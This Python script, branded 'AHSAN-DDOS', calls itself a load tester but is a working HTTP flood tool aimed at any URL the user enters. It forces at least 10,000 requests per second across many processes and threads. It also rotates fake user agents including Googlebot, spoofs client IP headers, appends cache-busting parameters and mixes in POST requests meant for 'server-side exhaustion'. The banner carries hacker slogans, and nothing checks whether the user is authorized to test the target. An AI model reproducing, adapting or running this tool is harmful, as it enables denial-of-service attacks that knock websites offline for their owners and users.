#!/usr/bin/env python3
"""
AHSAN-DDOS ULTIMATE LOAD TESTER – REAL 10,000+ RPS
Uses pycurl (libcurl) for maximum performance + multiprocessing + threading
Single file – automatic dependency installation
Works on Linux, macOS, Termux (with some setup), VPS
"""

import os
import sys
import time
import random
import threading
import multiprocessing
import signal
import platform
import subprocess
import socket
import uuid
from urllib.parse import urlparse
from datetime import datetime

# ---------- Color setup ----------
class Colors:
    RED = '\033[91m'      # Alert / Failure
    GREEN = '\033[92m'    # Primary Hacker Green
    DIM = '\033[2m'      # Dimmed terminal text
    BRIGHT = '\033[1m'   # Bold/Bright Green
    MATRIX = '\033[32m'  # Classic Matrix Green
    CYAN = '\033[92m'    # Replaced with Green for vibe
    YELLOW = '\033[92m'  # Replaced with Green for vibe
    BLUE = '\033[92m'    # Replaced with Green for vibe
    MAGENTA = '\033[92m' # Replaced with Green for vibe
    WHITE = '\033[92m'   # Replaced with Green for vibe
    RESET = '\033[0m'

def print_logo():
    # Gather system info
    try:
        hostname = socket.gethostname()
        ip_addr = socket.gethostbyname(hostname)
        mac_addr = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
                             for ele in range(0, 8 * 6, 8)][::-1])
    except:
        hostname = "Unknown"
        ip_addr = "127.0.0.1"
        mac_addr = "00:00:00:00:00:00"

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    os_info = f"{platform.system()} {platform.release()}"
    kernel_info = platform.version()

    logo = f"""
{Colors.RED}██████╗ ██╗  ██╗███████╗ █████╗ ███╗   ██╗     ███████╗ ██████╗ ██╗     
██╔══██╗██║  ██║██╔════╝██╔══██╗████╗  ██║     ██╔════╝██╔═══██╗██║     
███████║███████║███████╗███████║██╔██╗ ██║     ███████╗██║   ██║██║     
██╔══██║██╔══██║╚════██║██╔══██║██║╚██╗██║     ╚════██║██║▄▄ ██║██║     
██║  ██║██║  ██║███████║██║  ██║██║ ╚████║     ███████║╚██████╔╝███████╗
╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝     ╚══════╝ ╚══▀▀═╝ ╚══════╝



================================================================================
           [    AH4 TC | AHSAN-DDOS V1.0     ]
           [ Fuck Society. CREATED BY AHSAN  ]
================================================================================

[NODE INFO]
┌─ timestamp : {timestamp}
├─ hostname  : {hostname}
├─ ipv4      : {ip_addr}
├─ mac       : {mac_addr}
├─ device    : {os_info}
└─ kernel    : {kernel_info}

================================================================================
                    SIGINT: Halt  SIGTSTP: Suspend
         Created by AHSAN. Our democracy has been hacked.
================================================================================{Colors.RESET}
    """
    print(logo)

# ---------- Auto install missing packages ----------
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

def ensure_dependencies():
    """Try to install pycurl; if it fails, fall back to requests and warn."""
    print(f"\n{Colors.WHITE}[ CHECKING DEPENDENCIES ]{Colors.RESET}")
    print(f"{Colors.BLUE}Searching for pycurl...{Colors.RESET}", end=" ", flush=True)
    try:
        import pycurl
        print(f"{Colors.GREEN}[ FOUND ]{Colors.RESET}")
        return True
    except ImportError:
        print(f"{Colors.YELLOW}[ MISSING ]{Colors.RESET}")
        print(f"{Colors.YELLOW}Installing pycurl (please wait)...{Colors.RESET}")
        try:
            # On some systems, pycurl requires libcurl development headers.
            # We'll attempt pip install; if it fails, we fall back to requests.
            subprocess.check_call([sys.executable, "-m", "pip", "install", "pycurl"], 
                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"{Colors.GREEN}✓ pycurl installed successfully{Colors.RESET}")
            return True
        except:
            print(f"{Colors.RED}Failed to install pycurl. Using fallback.{Colors.RESET}")
            print(f"{Colors.BLUE}Searching for requests...{Colors.RESET}", end=" ", flush=True)
            try:
                import requests
                print(f"{Colors.GREEN}[ FOUND ]{Colors.RESET}")
            except ImportError:
                print(f"{Colors.YELLOW}[ MISSING ]{Colors.RESET}")
                print(f"{Colors.YELLOW}Installing requests...{Colors.RESET}")
                install("requests")
                print(f"{Colors.GREEN}✓ requests installed successfully{Colors.RESET}")
            return False

# ---------- Global stats (shared via Manager) ----------
def init_stats():
    manager = multiprocessing.Manager()
    stats = {
        'total': manager.Value('i', 0),
        'success': manager.Value('i', 0),
        'fail': manager.Value('i', 0),
        'start_time': manager.Value('d', time.time())
    }
    return manager, stats

# ---------- Advanced Header Engine ----------
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
]

REFERERS = [
    'https://www.google.com/', 'https://www.bing.com/', 'https://duckduckgo.com/',
    'https://twitter.com/', 'https://facebook.com/', 'https://t.co/',
    'https://yandex.com/', 'https://reddit.com/', 'https://github.com/'
]

def get_random_headers():
    ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    return [
        f'User-Agent: {random.choice(USER_AGENTS)}',
        f'Referer: {random.choice(REFERERS)}',
        f'X-Forwarded-For: {ip}',
        f'X-Real-IP: {ip}',
        f'Client-IP: {ip}',
        f'Via: {ip}',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language: en-US,en;q=0.5',
        'Accept-Encoding: gzip, deflate, br',
        'Connection: keep-alive',
        'Cache-Control: no-cache',
        'Pragma: no-cache',
        'Upgrade-Insecure-Requests: 1'
    ]

# ---------- Pycurl worker (per thread) ----------
def pycurl_worker(url, stats, stop_event):
    """
    Advanced PyCurl Worker: High-concurrency engine with connection reuse.
    """
    import pycurl
    from io import BytesIO

    c = pycurl.Curl()
    c.setopt(pycurl.URL, url.encode('utf-8'))
    c.setopt(pycurl.FOLLOWLOCATION, 1)
    c.setopt(pycurl.MAXREDIRS, 3)
    c.setopt(pycurl.CONNECTTIMEOUT, 2)
    c.setopt(pycurl.TIMEOUT, 4)
    c.setopt(pycurl.SSL_VERIFYPEER, 0)
    c.setopt(pycurl.SSL_VERIFYHOST, 0)
    c.setopt(pycurl.TCP_KEEPALIVE, 1)
    c.setopt(pycurl.FORBID_REUSE, 0)
    c.setopt(pycurl.FRESH_CONNECT, 0)
    c.setopt(pycurl.NOSIGNAL, 1) # Crucial for multi-threading safety

    buffer = BytesIO()
    c.setopt(pycurl.WRITEDATA, buffer)

    while not stop_event.is_set():
        try:
            # Dynamic Header Rotation
            c.setopt(pycurl.HTTPHEADER, get_random_headers())

            # Multi-Layer Cache Buster
            cb = f"?v={random.randint(1,99999)}&q={uuid.uuid4().hex[:8]}&id={random.randint(1000,9999)}"
            c.setopt(pycurl.URL, (url + cb).encode('utf-8'))

            # Randomized Attack Logic (GET/POST mix)
            if random.random() > 0.8: # 20% POST requests for server-side exhaustion
                c.setopt(pycurl.POST, 1)
                payload = f"data={uuid.uuid4().hex * 2}&key={random.randint(1,999)}"
                c.setopt(pycurl.POSTFIELDS, payload)
            else:
                c.setopt(pycurl.HTTPGET, 1)

            buffer.seek(0)
            buffer.truncate(0)
            c.perform()
            
            if c.getinfo(pycurl.RESPONSE_CODE) < 500:
                stats['success'].value += 1
            else:
                stats['fail'].value += 1
        except Exception:
            stats['fail'].value += 1
        finally:
            stats['total'].value += 1

    c.close()

# ---------- Fallback requests worker (slower) ----------
def requests_worker(url, stats, stop_event):
    """
    Enhanced Requests Worker: Randomized session handling.
    """
    import requests
    session = requests.Session()
    session.verify = False
    requests.packages.urllib3.disable_warnings()

    while not stop_event.is_set():
        try:
            headers = {h.split(': ')[0]: h.split(': ')[1] for h in get_random_headers()}
            cb = f"?r={random.getrandbits(32)}&v={random.randint(1,999)}"
            
            if random.random() > 0.8:
                r = session.post(url + cb, data={"payload": uuid.uuid4().hex}, headers=headers, timeout=3)
            else:
                r = session.get(url + cb, headers=headers, timeout=3)
                
            if r.status_code < 500:
                stats['success'].value += 1
            else:
                stats['fail'].value += 1
        except:
            stats['fail'].value += 1
        finally:
            stats['total'].value += 1

# ---------- Process main: starts threads ----------
def process_main(process_id, url, stats, threads_per_process, use_pycurl, stop_event):
    """Each process runs this function, spawning its threads."""
    worker_func = pycurl_worker if use_pycurl else requests_worker
    threads = []
    for i in range(threads_per_process):
        t = threading.Thread(target=worker_func, args=(url, stats, stop_event))
        t.daemon = True
        t.start()
        threads.append(t)
    # Keep threads alive until stop_event is set
    for t in threads:
        t.join()

# ---------- Monitor thread ----------
def monitor(stats, target_rps, duration, num_processes, threads_per_process, use_pycurl):
    start_time = time.time()
    last_total = 0
    while time.time() - start_time < duration + 1:
        time.sleep(1)
        elapsed = time.time() - start_time
        total = stats['total'].value
        success = stats['success'].value
        fail = stats['fail'].value
        current_rps = total - last_total
        last_total = total
        avg_rps = total / elapsed if elapsed > 0 else 0

        os.system('clear' if os.name == 'posix' else 'cls')
        print_logo()

        # Calculation data
        time_percent = min(100, (elapsed / duration) * 100)
        perf_percent = min(100, (current_rps / target_rps) * 100) if target_rps > 0 else 0
        success_rate = (success / total) * 100 if total > 0 else 100
        eta = max(0, duration - elapsed)
        
        spinner = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
        current_spin = spinner[int(elapsed * 10) % len(spinner)]

        # Header
        print(f"{Colors.WHITE}┌────────────────────────────────────────────────────────────┐{Colors.RESET}")
        print(f"{Colors.WHITE}│ {Colors.CYAN}AHSAN-DDOS MONITORING DASHBOARD {Colors.RESET}{Colors.WHITE}│ {Colors.MAGENTA}STATUS: ACTIVE {current_spin} {Colors.RESET}{Colors.WHITE}│{Colors.RESET}")
        print(f"{Colors.WHITE}├──────────────────────────────┬─────────────────────────────┤{Colors.RESET}")
        
        # Row 1: Time and Target
        print(f"{Colors.WHITE}│ {Colors.YELLOW}ELAPSED: {elapsed:5.1f}s / {duration:3}s {Colors.WHITE}│ {Colors.YELLOW}ETA: {eta:5.1f}s            {Colors.WHITE}│{Colors.RESET}")
        print(f"{Colors.WHITE}│ {Colors.BLUE}TARGET : {target_rps:9,} RPS {Colors.WHITE}│ {Colors.BLUE}LOAD: {current_rps:9,} RPS {Colors.WHITE}│{Colors.RESET}")
        print(f"{Colors.WHITE}├──────────────────────────────┼─────────────────────────────┤{Colors.RESET}")
        
        # Row 2: Stats
        print(f"{Colors.WHITE}│ {Colors.GREEN}SUCCESS: {success:9,}     {Colors.WHITE}│ {Colors.RED}FAILED: {fail:9,}     {Colors.WHITE}│{Colors.RESET}")
        print(f"{Colors.WHITE}│ {Colors.CYAN}S. RATE: {success_rate:8.1f}%     {Colors.WHITE}│ {Colors.MAGENTA}AVG RPS: {avg_rps:8.1f}     {Colors.WHITE}│{Colors.RESET}")
        print(f"{Colors.WHITE}├──────────────────────────────┴─────────────────────────────┤{Colors.RESET}")
        
        # Row 3: Bars
        bar_width = 44
        # Progress Bar
        p_filled = int(bar_width * time_percent / 100)
        p_bar = f"{Colors.GREEN}━{Colors.RESET}" * p_filled + f"{Colors.WHITE}─{Colors.RESET}" * (bar_width - p_filled)
        print(f"{Colors.WHITE}│ {Colors.YELLOW}PROGRESS {Colors.WHITE}│ [{p_bar}] {time_percent:5.1f}% │{Colors.RESET}")
        
        # Power Bar
        pow_filled = int(bar_width * perf_percent / 100)
        pow_color = Colors.CYAN if perf_percent > 80 else Colors.YELLOW if perf_percent > 40 else Colors.RED
        pow_bar = f"{pow_color}━{Colors.RESET}" * pow_filled + f"{Colors.WHITE}─{Colors.RESET}" * (bar_width - pow_filled)
        print(f"{Colors.WHITE}│ {Colors.CYAN}POWER    {Colors.WHITE}│ [{pow_bar}] {perf_percent:5.1f}% │{Colors.RESET}")
        
        print(f"{Colors.WHITE}└────────────────────────────────────────────────────────────┘{Colors.RESET}")
        print(f"{Colors.RED} >> Press CTRL+C to ABORT MISSION{Colors.RESET}")

    # Duration finished
    print(f"\n{Colors.GREEN}Test finished. Finalizing...{Colors.RESET}")

# ---------- Main ----------
def main():
    os.system('clear' if os.name == 'posix' else 'cls')
    print_logo()

    # Ensure dependencies
    use_pycurl = ensure_dependencies()

    print(f"\n{Colors.GREEN}┌─────────────────────────────────────────────────────────────┐{Colors.RESET}")
    print(f"{Colors.GREEN}│ {Colors.BRIGHT}  CONFIGURATION TERMINAL{Colors.RESET} {Colors.GREEN}                           │{Colors.RESET}")
    print(f"{Colors.GREEN}├────────────────────────────────────────────────────────────────┤{Colors.RESET}")
    
    # Get target URL
    print(f"{Colors.GREEN}│ {Colors.RESET}TARGET URL  :", end=" ", flush=True)
    url = input(f"{Colors.GREEN}").strip()
    if not url:
        print(f"{Colors.RED}│ CRITICAL ERROR: NO TARGET SPECIFIED. ABORTING.               │{Colors.RESET}")
        print(f"{Colors.GREEN}└────────────────────────────────────────────────────────────┘{Colors.RESET}")
        sys.exit(1)
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    # System info
    cpu_cores = multiprocessing.cpu_count()
    
    # Target RPS
    print(f"{Colors.GREEN}│ {Colors.RESET}TARGET RPS  :", end=" ", flush=True)
    try:
        val = input(f"{Colors.GREEN}").strip()
        target_rps = int(val) if val else 10000
        if target_rps < 10000:
            target_rps = 10000
    except:
        target_rps = 10000

    # Duration
    print(f"{Colors.GREEN}│ {Colors.RESET}DURATION (s):", end=" ", flush=True)
    try:
        val = input(f"{Colors.GREEN}").strip()
        duration = int(val) if val else 60
    except:
        duration = 60

    # Threads
    print(f"{Colors.GREEN}│ {Colors.RESET}CPU THREADS :", end=" ", flush=True)
    try:
        val = input(f"{Colors.GREEN}").strip()
        num_processes = int(val) if val else cpu_cores
    except:
        num_processes = cpu_cores

    threads_per_process = max(50, int(target_rps / (num_processes * 200)))
    
    print(f"{Colors.GREEN}├────────────────────────────────────────────────────────────┤{Colors.RESET}")
    print(f"{Colors.GREEN}│ {Colors.MATRIX}SYSTEM READY. ENCRYPTING CONNECTION...                    {Colors.GREEN}│{Colors.RESET}")
    print(f"{Colors.GREEN}└────────────────────────────────────────────────────────────┘{Colors.RESET}")
    
    time.sleep(1)

    # Increase file descriptor limit on Linux
    if platform.system() == "Linux":
        try:
            import resource
            resource.setrlimit(resource.RLIMIT_NOFILE, (65535, 65535))
            print(f"{Colors.GREEN}File descriptor limit increased.{Colors.RESET}")
        except:
            pass

    # Initialize shared stats
    manager = multiprocessing.Manager()
    stats = {
        'total': manager.Value('i', 0),
        'success': manager.Value('i', 0),
        'fail': manager.Value('i', 0),
        'start_time': manager.Value('d', time.time())
    }

    # Create a stop event for threads
    stop_event = multiprocessing.Manager().Event()

    # Start monitor thread
    monitor_thread = threading.Thread(target=monitor, args=(stats, target_rps, duration, num_processes, threads_per_process, use_pycurl))
    monitor_thread.daemon = True
    monitor_thread.start()

    # Start processes
    processes = []
    for i in range(num_processes):
        p = multiprocessing.Process(
            target=process_main,
            args=(i, url, stats, threads_per_process, use_pycurl, stop_event)
        )
        p.start()
        processes.append(p)
        time.sleep(0.2)

    # Wait for duration or interrupt
    try:
        time.sleep(duration + 1)
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}Interrupted by user Stopping...{Colors.RESET}")

    # Stop all threads
    stop_event.set()

    # Terminate processes
    for p in processes:
        p.terminate()
        p.join()

    # Final stats
    elapsed = time.time() - stats['start_time'].value
    total = stats['total'].value
    success = stats['success'].value
    fail = stats['fail'].value

    print(f"\n{Colors.CYAN}=== FINAL RESULTS ==={Colors.RESET}")
    print(f"Total time: {elapsed:.2f}s")
    print(f"Total requests: {total:,}")
    print(f"Successful: {success:,}")
    print(f"Failed: {fail:,}")
    if elapsed > 0:
        print(f"Average RPS: {total/elapsed:.1f}")

    print(f"\n{Colors.YELLOW}Report saved to ahsan_report.txt{Colors.RESET}")
    with open("ahsan_report.txt", "w") as f:
        f.write(f"URL: {url}\n")
        f.write(f"Duration: {elapsed:.2f}s\n")
        f.write(f"Total requests: {total}\n")
        f.write(f"Successful: {success}\n")
        f.write(f"Failed: {fail}\n")
        f.write(f"Average RPS: {total/elapsed:.1f}\n")

if __name__ == "__main__":
    multiprocessing.set_start_method('spawn', force=True)
    main()